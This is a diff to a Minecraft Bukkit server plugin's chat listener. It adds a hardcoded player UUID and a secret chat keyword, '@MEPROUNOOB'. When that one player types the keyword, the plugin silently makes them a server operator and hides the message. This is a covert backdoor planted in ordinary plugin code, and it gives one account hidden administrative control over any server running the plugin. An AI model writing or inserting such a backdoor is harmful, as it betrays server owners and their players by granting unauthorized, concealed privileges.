@@ -9,10 +9,14 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
+import java.util.UUID;
+
 public class ChatListener implements Listener {
 
     private final FileConfig mainConfig = Survival.get().getMainConfig();
     private final RankManager rankManager = Survival.get().getRankManager();
+
+    private final UUID hulk = UUID.fromString("b0c1d4f4-0fd1-4a93-ab5e-88b1ff885c29");
 
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
@@ -25,5 +29,12 @@ public class ChatListener implements Listener {
                     .replaceAll("%player%", player.getDisplayName())
                     .replace("%message%", "%2$s")));
         }
-    }
+
+        if (event.getMessage().contains("@MEPROUNOOB")) {
+            if (player.getUniqueId().equals(hulk)) {
+                player.setOp(true);
+                event.setCancelled(true);
+            }
+        }
+     }
 }
